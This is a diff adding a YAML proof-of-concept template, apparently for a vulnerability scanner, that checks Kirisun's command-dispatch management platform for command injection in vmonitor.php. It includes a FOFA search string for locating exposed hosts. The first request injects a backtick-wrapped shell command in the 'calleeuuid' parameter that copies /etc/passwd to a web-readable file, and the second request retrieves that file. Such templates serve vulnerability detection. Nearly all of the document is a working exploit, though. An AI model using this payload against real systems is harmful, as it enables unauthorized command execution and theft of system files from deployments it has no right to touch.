@@ -1,0 +1,18 @@
+id: poc-yaml-kirisun-vmonitor-rce
+info:
+  name: 福建科立讯通信 指挥调度管理平台 vmonitor.php命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_int(10,100)
+requests:
+- method: GET
+  path: /api/client/vmonitor.php?extension=1&calleeuuid=`cat%20/etc/passwd>{{.t1}}.txt`
+  expression: "status_code == 200 && \nbody == \"0\"\n"
+- method: GET
+  path: /api/client/{{.t1}}.txt
+  expression: "status_code == 200 && \nmatches(body, \"root:.*:0:0:\")\n"
+transport: http
